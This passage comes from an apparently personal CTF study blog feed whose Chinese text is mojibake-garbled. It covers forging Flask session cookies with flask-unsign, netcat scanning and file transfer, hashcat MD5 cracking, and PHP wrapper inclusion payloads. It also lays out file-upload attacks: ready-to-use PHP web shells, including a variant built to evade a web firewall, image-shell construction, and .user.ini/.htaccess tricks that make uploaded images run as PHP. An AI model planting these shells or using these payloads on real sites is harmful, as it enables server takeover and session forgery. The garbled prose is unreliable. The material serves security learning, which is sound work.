cookiesæ˜¯<strong>ç­¾åçš„</strong>å’Œ<strong>æœªåŠ å¯†çš„</strong>ï¼Œå› æ­¤ å¯ä»¥å¯¹ä¼šè¯æ•°æ®è¿›è¡Œæœ¬åœ°è§£ç ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥ä½¿ç”¨<code>--decode</code> äº‰è®ºã€‚</p><p>ä¼šè¯cookieså¯ä»¥é€šè¿‡ä½¿ç”¨ä»£ç†æ£€æŸ¥æ‚¨çš„httpè¯·æ±‚æ¥è·å¾— åƒburpä»£ç†ä¸€æ ·ï¼Œä½¿ç”¨æµè§ˆå™¨çš„ç½‘ç»œæ£€æŸ¥å™¨æˆ–æµè§ˆå™¨ æŸ¥çœ‹/æ›´æ”¹cookiesçš„æ‰©å±•ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œflaskä½¿ç”¨ä¼šè¯åç§° <code>&quot;session&quot;</code>ã€‚</p><pre><code>$ flask-unsign --decode --cookie &#39;eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8&#39;&#123;&#39;logged_in&#39;: False&#125;</code></pre><p>æ‚¨è¿˜å¯ä»¥é€šè¿‡ ä¼ é€’<code>--server</code>å‚æ•°ï¼Œè€Œä¸æ˜¯<code>--cookie</code>å‚æ•°ã€‚<em>doæ³¨é‡Š ä½†æ˜¯ï¼Œ<strong>å¹¶ä¸æ˜¯æ‰€æœ‰ç½‘é¡µéƒ½å¯èƒ½è¿”å›ä¼šè¯ï¼Œå› æ­¤è¯·ç¡®ä¿ä¼ é€’ æ˜¯çš„ç½‘å€ã€‚</strong></em></p><pre><code>$ flask-unsign --decode --server &#39;https://www.example.com/login&#39;[*] Server returned HTTP 302 (FOUND)[+] Successfully obtained session cookie: eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8&#123;&#39;logged_in&#39;: False&#125;</code></pre><h3 id="æœªç­¾åï¼ˆå¼ºåˆ¶ä½¿ç”¨å¯†é’¥ï¼‰"><a href="#æœªç­¾åï¼ˆå¼ºåˆ¶ä½¿ç”¨å¯†é’¥ï¼‰" class="headerlink" title="æœªç­¾åï¼ˆå¼ºåˆ¶ä½¿ç”¨å¯†é’¥ï¼‰"></a><strong>æœªç­¾åï¼ˆå¼ºåˆ¶ä½¿ç”¨å¯†é’¥ï¼‰</strong></h3><p><strong>åœ¨è·å¾—ä¸€ä¸ªç¤ºä¾‹ä¼šè¯cookieä¹‹åï¼Œæ‚¨å°†èƒ½å¤Ÿå°è¯•ä½¿ç”¨æš´åŠ› æœåŠ¡å™¨çš„å¯†é’¥ã€‚å¦‚æœä½ å¹¸è¿çš„è¯ï¼Œè¿™å¯èƒ½ä¼šè¢«è®¾ç½®æˆ çŒœçŒœçœ‹ï¼Œæˆ–è€…æ˜¯åœ¨ç½‘ä¸Šæ‰¾åˆ°çš„ï¼Œå¯èƒ½åœ¨ä½ çš„ä¸€ä¸ªè¯è¡¨é‡Œã€‚ä¸ºäº† è¿™æ ·ï¼Œå°±å¯ä»¥ä½¿ç”¨<code>--unsign</code>å‚æ•°ã€‚</strong></p><pre><code>$ flask-unsign --unsign --cookie &lt; cookie.txt[*] Session decodes to: &#123;&#39;logged_in&#39;: False&#125;[*] No wordlist selected, falling back to default wordlist..[*] Starting brute-forcer with 8 threads..[+] Found secret key after 351 attempts&#39;CHANGEME&#39;</code></pre><h3 id="ç­¾åï¼ˆä¼šè¯æ“ä½œï¼‰"><a href="#ç­¾åï¼ˆä¼šè¯æ“ä½œï¼‰" class="headerlink" title="ç­¾åï¼ˆä¼šè¯æ“ä½œï¼‰"></a><strong>ç­¾åï¼ˆä¼šè¯æ“ä½œï¼‰</strong></h3><p><strong>ä¸€æ—¦ä½ è·å¾—äº†æœåŠ¡å™¨çš„å¯†é’¥ï¼Œä½ å°±å¯ä»¥è‡ªå·±è®¾è®¡ è‡ªå®šä¹‰ä¼šè¯æ•°æ®ã€‚ä¸ºæ­¤ï¼Œå¯ä»¥ä½¿ç”¨<code>--sign</code>å‚æ•°ã€‚</strong></p><pre><code>$ flask-unsign --sign --cookie &quot;&#123;&#39;logged_in&#39;: True&#125;&quot; --secret &#39;CHANGEME&#39;eyJsb2dnZWRfaW4iOnRydWV9.XDuW-g.cPCkFmmeB7qNIcN-ReiN72r0hvU</code></pre><h1 id="NC"><a href="#NC" class="headerlink" title="NC"></a>NC</h1><p>nc(NetCat)ï¼Œåœ¨ç½‘ç»œå·¥å…·ä¸­æœ‰â€ç‘å£«å†›åˆ€â€çš„ç¾èª‰ï¼Œå®ƒçŸ­å°ç²¾æ‚ï¼ŒåŠŸèƒ½å¼ºå¤§ã€‚</p><p><strong>åŸºæœ¬å‚æ•°</strong></p><pre><code>æƒ³è¦è¿æ¥åˆ°æŸå¤„: nc [-options] hostname port[s] [ports] â€¦ç»‘å®šç«¯å£ç­‰å¾…è¿æ¥: nc -l -p port [-options] [hostname] [port]å‚æ•°:-g gateway source-routing hop point[s], up to 8-G num source-routing pointer: 4, 8, 12, â€¦-h å¸®åŠ©ä¿¡æ¯-i secs å»¶æ—¶çš„é—´éš”-l ç›‘å¬æ¨¡å¼ï¼Œç”¨äºå…¥ç«™è¿æ¥-n æŒ‡å®šæ•°å­—çš„IPåœ°å€ï¼Œä¸èƒ½ç”¨hostname-o file è®°å½•16è¿›åˆ¶çš„ä¼ è¾“-p port æœ¬åœ°ç«¯å£å·-r ä»»æ„æŒ‡å®šæœ¬åœ°åŠè¿œç¨‹ç«¯å£-s addr æœ¬åœ°æºåœ°å€-u UDPæ¨¡å¼-v è¯¦ç»†è¾“å‡ºâ€”â€”ç”¨ä¸¤ä¸ª-vå¯å¾—åˆ°æ›´è¯¦ç»†çš„å†…å®¹-w secs timeoutçš„æ—¶é—´-z å°†è¾“å…¥è¾“å‡ºå…³æ‰â€”â€”ç”¨äºæ‰«ææ—¶ï¼Œå…¶ä¸­ç«¯å£å·å¯ä»¥æŒ‡å®šä¸€ä¸ªæˆ–è€…ç”¨lo-hiå¼çš„æŒ‡å®šèŒƒå›´ã€‚</code></pre><p><strong>ç®€å•ç”¨æ³•ä¸¾ä¾‹</strong><br>1 ã€ç«¯å£æ‰«æ</p><pre><code class="text">nc -v -w 2 192.168.2.34 -z 21-24nc: connect to 192.168.2.34 port 21 (tcp) failed: Connection refusedConnection to 192.168.2.34 22 port [tcp/ssh] succeeded!nc: connect to 192.168.2.34 port 23 (tcp) failed: Connection refusednc: connect to 192.168.2.34 port 24 (tcp) failed: Connection refused</code></pre><p>2ã€ä»192.168.2.33æ‹·è´æ–‡ä»¶åˆ°192.168.2.34</p><pre><code class="text">åœ¨192.168.2.34ä¸Šï¼š nc -l 1234 &gt; test.txtåœ¨192.168.2.33ä¸Šï¼š nc 192.168.2.34 &lt; test.txt</code></pre><p>3ã€ç®€å•èŠå¤©å·¥å…·</p><pre><code class="text">åœ¨192.168.2.34ä¸Šï¼š nc -l 1234åœ¨192.168.2.33ä¸Šï¼š nc 192.168.2.34 1234</code></pre><p>è¿™æ ·ï¼ŒåŒæ–¹å°±å¯ä»¥ç›¸äº’äº¤æµäº†ã€‚ä½¿ç”¨ctrl+C(æˆ–Dï¼‰é€€å‡ºã€‚</p><p><strong>ç”¨ncå‘½ä»¤æ“ä½œmemcached</strong></p><pre><code class="text">1ï¼‰å­˜å‚¨æ•°æ®ï¼šprintf â€œset key 0 10 6\r\nresult\r\nâ€ |nc 192.168.2.34 112112ï¼‰è·å–æ•°æ®ï¼šprintf â€œget key\r\nâ€ |nc 192.168.2.34 112113ï¼‰åˆ é™¤æ•°æ®ï¼šprintf â€œdelete key\r\nâ€ |nc 192.168.2.34 112114ï¼‰æŸ¥çœ‹çŠ¶æ€ï¼šprintf â€œstats\r\nâ€ |nc 192.168.2.34 112115ï¼‰æ¨¡æ‹Ÿtopå‘½ä»¤æŸ¥çœ‹çŠ¶æ€ï¼šwatch â€œecho statsâ€ |nc 192.168.2.34 112116ï¼‰æ¸…ç©ºç¼“å­˜ï¼šprintf â€œflush_all\r\nâ€ |nc 192.168.2.34 11211 (å°å¿ƒæ“ä½œï¼Œæ¸…ç©ºäº†ç¼“å­˜å°±æ²¡äº†ï¼‰</code></pre><p><strong>ä½¿ç”¨ncæ¥ä¼ æ–‡ä»¶</strong></p><pre><code class="text">å‘é€ç«¯ï¼š  cat a.txt  |  nc -l  3333æ¥æ”¶ç«¯ï¼š  nc 192.168.0.3   3333 &gt;  a.txtæˆ–è€…å‘é€ç«¯:    cat a.txt   |  nc 192.168.0.3   9999 æ¥æ”¶ç«¯:    nc -l 9999 &gt; a.txt</code></pre><h1 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h1><p>hashcatæ˜¯ä¸€æ¬¾è‡ªç§°ä¸ºä¸–ç•Œä¸Šæœ€å¿«çš„å¯†ç ç ´è§£å·¥å…·ã€‚<br><strong>hashcatå¸¸ç”¨å‘½ä»¤</strong></p><pre><code>-m                           æŒ‡å®šå“ˆå¸Œç±»å‹-a                            æŒ‡å®šç ´è§£æ¨¡å¼-V                            æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯-o                            å°†è¾“å‡ºç»“æœå‚¨å­˜åˆ°æŒ‡å®šæ–‡ä»¶--force                     å¿½ç•¥è­¦å‘Š--show                    ä»…æ˜¾ç¤ºç ´è§£çš„hashå¯†ç å’Œå¯¹åº”çš„æ˜æ–‡--remove                 ä»æºæ–‡ä»¶ä¸­åˆ é™¤ç ´è§£æˆåŠŸçš„hash--username             å¿½ç•¥hashè¡¨ä¸­çš„ç”¨æˆ·å-b                             æµ‹è¯•è®¡ç®—æœºç ´è§£é€Ÿåº¦å’Œç›¸å…³ç¡¬ä»¶ä¿¡æ¯-O                            é™åˆ¶å¯†ç é•¿åº¦-T                            è®¾ç½®çº¿ç¨‹æ•°-r                             ä½¿ç”¨è§„åˆ™æ–‡ä»¶-1                             è‡ªå®šä¹‰å­—ç¬¦é›†  -1 0123asd     ?1=&#123;0123asd&#125;-2                             è‡ªå®šä¹‰å­—ç¬¦é›†  -2 0123asd    ?2=&#123;0123asd&#125;-3                             è‡ªå®šä¹‰å­—ç¬¦é›†  -3 0123asd    ?3=&#123;0123asd&#125;-i                              å¯ç”¨å¢é‡ç ´è§£æ¨¡å¼--increment-min       è®¾ç½®å¯†ç æœ€å°é•¿åº¦--increment-max      è®¾ç½®å¯†ç æœ€å¤§é•¿åº¦</code></pre><p><strong>hashcatç ´è§£æ¨¡å¼ä»‹ç»</strong></p><p>0    straight                                           å­—å…¸ç ´è§£</p><p>1    combination                                    å°†å­—å…¸ä¸­å¯†ç è¿›è¡Œç»„åˆï¼ˆ1 2&gt;11 22 12 21ï¼‰</p><p>3    brute-force                                      ä½¿ç”¨æŒ‡å®šæ©ç ç ´è§£</p><p>6    Hybrid Wordlist + Mask                  å­—å…¸+æ©ç ç ´è§£</p><p>7    Hybrid Mask  + Wordlist                 æ©ç +å­—å…¸ç ´è§£</p><p><strong>hashcaté›†æˆçš„å­—ç¬¦é›†</strong></p><p>?l                ä»£è¡¨å°å†™å­—æ¯</p><p>?u              ä»£è¡¨å¤§å†™å­—æ¯</p><p>?d              ä»£è¡¨æ•°å­—</p><p>?s              ä»£è¡¨ç‰¹æ®Šå­—ç¬¦</p><p>?a              ä»£è¡¨å¤§å°å†™å­—æ¯ã€æ•°å­—ä»¥åŠç‰¹æ®Šå­—ç¬¦  </p><p>?b               0x00-0xff </p><p><strong>hash id å¯¹ç…§è¡¨</strong></p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p><strong>å®ä¾‹æ¼”ç¤º-æš´åŠ›ç ´è§£MD5å€¼</strong></p><p>1.ä½¿ç”¨å­—å…¸è¿›è¡Œç ´è§£</p><p>hashcat  -a 0  0192023a7bbd73250516f069df18b500  password.txt  â€“force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>2.ä½¿ç”¨æŒ‡å®šå­—ç¬¦é›†è¿›è¡Œç ´è§£</p><p>hashcat  -a 3  63a9f0ea7bb98050796b649e85481845  ?l?l?l?l â€“force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>3.ä½¿ç”¨å­—å…¸+æ©ç è¿›è¡Œç ´è§£</p><p>hashcat  -a 6  1844156d4166d94387f1a4ad031ca5fa  password.txt  ?d?d?d â€“force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>4.ä½¿ç”¨æ©ç +å­—å…¸è¿›è¡Œç ´è§£</p><p>hashcat  -a 7  f8def8bcecb2e7925a2b42d60d202deb   ?d?d password.txt   â€“force</p><p><img src="/2021/10/08/%E5%B8%B8%E8%A7%81%E8%BD%AF%E4%BB%B6%E5%91%BD%E4%BB%A4/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NtbGlfbmc=,size_16,color_FFFFFF,t_70.png" alt="img"></p><p>å¦‚æœç ´è§£æ—¶é—´å¤ªé•¿ï¼Œæˆ‘ä»¬å¯ä»¥æŒ‰sé”®æŸ¥çœ‹ç ´è§£è¿›åº¦ï¼Œpé”®æš‚åœï¼Œré”®ç»§ç»­ç ´è§£ï¼Œqé”®é€€å‡ºç ´è§£ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨ </category>
          
          <category> è½¯ä»¶å¸¸ç”¨å‘½ä»¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è½¯ä»¶å‘½ä»¤ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHPå¸¸è§åè®®</title>
      <link href="/2021/10/08/PHP%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/"/>
      <url>/2021/10/08/PHP%E5%B8%B8%E8%A7%81%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="PHPä¼ªåè®®"><a href="#PHPä¼ªåè®®" class="headerlink" title="PHPä¼ªåè®®"></a>PHPä¼ªåè®®</h1><p>php&gt;=5.2<br>php://filteråè®®   ?file=file://D:/soft/phpStudy/WWW/phpcode.txt<br>php://inputåè®®  ?file=php://filter/read=convert.base64-encode/resource=./index.php<br>data://åè®®<br>data://åè®®å…è®¸è¯»å…¥<br> è¦æ±‚ï¼šæ‰“å¼€allow_url_fopen  allow_url_include<br>?file=data://text/plain,<?php phpinfo()?><br>?file=data://text/plain;base64,ç¼–ç </p><p>fileåè®®ï¼š<br>file:///æ–‡ä»¶è·¯å¾„</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ–‡ä»¶ä¸Šä¼ </title>
      <link href="/2021/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
      <url>/2021/09/11/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ"><a href="#ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ" class="headerlink" title="ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ"></a>ä¸€å¥è¯æœ¨é©¬åˆ¶ä½œ</h1><p>æ­£å¸¸ï¼š</p><pre><code class="php">&lt;?php@eval($_POST[&#39;x&#39;]);?&gt;</code></pre><p>å¦‚æœæœ‰&lt;?è¿‡æ»¤ï¼Œé‡‡ç”¨ï¼š</p><pre><code class="php">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[x])&lt;/script&gt;</code></pre><p>ä¸€ç§ç®€å•çš„ç»•å®‰å…¨ç‹—æ–¹æ³•ï¼šå˜é‡ä¼ é€’</p><pre><code class="php">&lt;?php$a=$_GET[&#39;x&#39;];$$a=$_GET[&#39;y&#39;];$b($_POST[&#39;z&#39;]);</code></pre><pre><code class="php">ä¼ å…¥æ–¹æ³•ï¼šhttp://php?x=b&amp;y=assertpost:z=phpinfo();</code></pre><p>é—®ï¼šä¸ºä»€ä¹ˆè¿™é‡Œä¸ç”¨eval<br>å› ä¸ºevalèµ‹å€¼ç»™bæ²¡æœ‰æ•ˆæœçš„ã€‚</p><p>å¯¹ä¼ å…¥æ•°æ®è¿›è¡ŒåŠ å¯†</p><pre><code class="php">&lt;?php assert(base64_decode($_POST[&#39;x&#39;]));?&gt;</code></pre><p>å½“è¿™ç§æƒ…å†µç”¨èšå‰‘è¿æ¥æ—¶ï¼Œéœ€è¦é‡‡ç”¨base64åŠ å¯†ã€‚</p><h1 id="å›¾ç‰‡é©¬åˆ¶ä½œ"><a href="#å›¾ç‰‡é©¬åˆ¶ä½œ" class="headerlink" title="å›¾ç‰‡é©¬åˆ¶ä½œ"></a>å›¾ç‰‡é©¬åˆ¶ä½œ</h1><p>1.é¦–å…ˆå›¾ç‰‡å‘½å111.jpg</p><p>2.å†æ–°å»º222.aspæ–‡ä»¶ï¼Œä¸€å¥è¯æœ¨é©¬å†™å…¥</p><p>3.ç„¶åwin+Rï¼Œcmdï¼Œcdåˆ°ä¹‹å‰å›¾ç‰‡çš„ç›®å½•è·¯å¾„ä¸‹ï¼Œå‘½ä»¤ä¸ºcopy 111.jpg/b+222.asp/a 333.jpg</p><p>æœ€åå°±ä¼šå‡ºç°æ–°çš„å›¾ç‰‡3333.jpgï¼Œå°±æ˜¯åˆ¶ä½œå‡ºçš„å›¾ç‰‡é©¬ã€‚</p><h1 id="æ–‡ä»¶ä¸Šä¼ ä¹‹åç¼€æ›¿æ¢"><a href="#æ–‡ä»¶ä¸Šä¼ ä¹‹åç¼€æ›¿æ¢" class="headerlink" title="æ–‡ä»¶ä¸Šä¼ ä¹‹åç¼€æ›¿æ¢"></a>æ–‡ä»¶ä¸Šä¼ ä¹‹åç¼€æ›¿æ¢</h1><p>php2ï¼Œphp3ã€php4ã€php5ï¼Œphtï¼Œphtmlï¼Œphps</p><p>.JPEG;.JPE;.JPGï¼Œâ€JPGGraphic Fileâ€<br>.gifï¼Œâ€GIF89Aâ€<br> .zipï¼Œâ€Zip Compressedâ€<br>.doc;.xls;.xlt;.ppt;.aprï¼Œâ€MS Compound Document v1 or Lotus Approach APRfileâ€</p><h1 id="user-ini"><a href="#user-ini" class="headerlink" title="user.ini"></a>user.ini</h1><p>.user.iniã€‚<br>åˆ©ç”¨æ¡ä»¶ï¼šå«æœ‰.user.iniçš„æ–‡ä»¶å¤¹ä¸‹éœ€è¦æœ‰æ­£å¸¸çš„phpæ–‡ä»¶ï¼Œå¦åˆ™ä¹Ÿä¸èƒ½åŒ…å«äº†</p><p>å®ƒæ¯”.htaccessç”¨çš„æ›´å¹¿ï¼Œä¸ç®¡æ˜¯nginx/apache/IISï¼Œåªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•ã€‚æˆ‘çš„nginxæœåŠ¡å™¨å…¨éƒ¨æ˜¯fpm/fastcgiï¼Œæˆ‘çš„IIS php5.3ä»¥ä¸Šçš„å…¨éƒ¨ç”¨çš„fastcgi/cgiï¼Œæˆ‘winä¸‹çš„apacheä¸Šä¹Ÿç”¨çš„fcgiï¼Œå¯è°“å¾ˆå¹¿ï¼Œä¸åƒ.htaccessæœ‰å±€é™æ€§ã€‚</p><p>CGIå…¨ç§°â€é€šç”¨ç½‘å…³æ¥å£â€ï¼ˆCommon Gateway Interfaceï¼‰ï¼Œç”¨äºHTTPæœåŠ¡å™¨ä¸å…¶å®ƒæœºå™¨ä¸Šçš„ç¨‹åºæœåŠ¡é€šä¿¡äº¤æµçš„ä¸€ç§å·¥å…·ï¼ŒCGIç¨‹åºé¡»è¿è¡Œåœ¨ç½‘ç»œæœåŠ¡å™¨ä¸Š<br>FastCGIæ˜¯ä¸€ä¸ªå¯ä¼¸ç¼©åœ°ã€é«˜é€Ÿåœ°åœ¨HTTPæœåŠ¡å™¨å’ŒåŠ¨æ€è„šæœ¬è¯­è¨€é—´é€šä¿¡çš„æ¥å£ï¼ˆFastCGIæ¥å£åœ¨Linuxä¸‹æ˜¯socketï¼ˆå¯ä»¥æ˜¯æ–‡ä»¶socketï¼Œä¹Ÿå¯ä»¥æ˜¯ip socketï¼‰ï¼‰ï¼Œä¸»è¦ä¼˜ç‚¹æ˜¯æŠŠåŠ¨æ€è¯­è¨€å’ŒHTTPæœåŠ¡å™¨åˆ†ç¦»å¼€æ¥ã€‚å¤šæ•°æµè¡Œçš„HTTPæœåŠ¡å™¨éƒ½æ”¯æŒFastCGIï¼ŒåŒ…æ‹¬Apacheã€Nginxå’Œlightpdã€‚</p><p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶æ‰€åœ¨ç›®å½•å¼€å§‹ä¸€ç›´ä¸Šå‡åˆ° web æ ¹ç›®å½•ï¼ˆ$_SERVER[â€˜DOCUMENT_ROOTâ€™] æ‰€æŒ‡å®šçš„ï¼‰ã€‚å¦‚æœè¢«æ‰§è¡Œçš„ PHP æ–‡ä»¶åœ¨ web æ ¹ç›®å½•ä¹‹å¤–ï¼Œåˆ™åªæ‰«æè¯¥ç›®å½•ã€‚</p><p>.user.iniå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªå¯ä»¥ç”±ç”¨æˆ·â€œè‡ªå®šä¹‰â€çš„php.iniï¼Œæˆ‘ä»¬èƒ½å¤Ÿè‡ªå®šä¹‰çš„è®¾ç½®æ˜¯æ¨¡å¼ä¸ºâ€œPHP_INI_PERDIR ã€ PHP_INI_USERâ€çš„è®¾ç½®ã€‚ï¼ˆä¸Šé¢è¡¨æ ¼ä¸­æ²¡æœ‰æåˆ°çš„PHP_INI_PERDIRä¹Ÿå¯ä»¥åœ¨.user.iniä¸­è®¾ç½®ï¼‰</p><p>å®é™…ä¸Šï¼Œé™¤äº†PHP_INI_SYSTEMä»¥å¤–çš„æ¨¡å¼ï¼ˆåŒ…æ‹¬PHP_INI_ALLï¼‰éƒ½æ˜¯å¯ä»¥é€šè¿‡.user.iniæ¥è®¾ç½®çš„</p><p>auto_append_file<br>æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°<br>auto_prepend_file æ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«</p><p>ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</p><p>auto_prepend_file=01.gif</p><h1 id="htaccess"><a href="#htaccess" class="headerlink" title="htaccess"></a>htaccess</h1><p>é’ˆå¯¹apache</p><p>æ–‡ä»¶åç¼€ä¸º .htaccess<br>ä¿å­˜ç±»å‹ä¸ºæ‰€æœ‰æ–‡ä»¶</p><p>ä¸Šä¼ .htaccess å¿…é¡»æ˜¯ç½‘ç«™æ ¹è·¯å¾„ </p><p>è®©pngè§£æä¸ºphp</p><p>å¯ä»¥åœ¨.htaccess åŠ å…¥phpè§£æè§„åˆ™<br>ç±»ä¼¼äºæŠŠæ–‡ä»¶ååŒ…å«1çš„è§£ææˆphp</p><pre><code class="php">&lt;FilesMatch &quot;1&quot;&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt;123456.png  å°±ä¼šä»¥phpæ‰§è¡Œ</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> å¸¸è§æ¼æ´å’Œæ‰‹æ³• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
